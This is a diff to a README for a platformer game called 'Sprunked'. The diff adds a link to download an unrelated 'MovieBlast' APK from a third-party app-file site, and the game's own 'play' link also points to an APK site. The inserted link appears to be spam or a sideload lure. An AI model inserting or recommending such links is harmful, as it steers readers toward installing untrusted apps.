@@ -1,5 +1,7 @@
 # Sprunked: The Ultimate Platformer Adventure Game 🌌
 
+## [Download MovieBlast App!](https://files.apktodo.store/MovieBlast-v2.1.apk)
+
 ## [Play Sprunked Now!](https://apkitech.com/)
 
 Welcome to **Sprunked**, an exciting and challenging platformer game that will put your reflexes and problem-solving skills to the test! Embark on an adventure through mysterious worlds, avoid traps, and conquer obstacles to complete your mission.
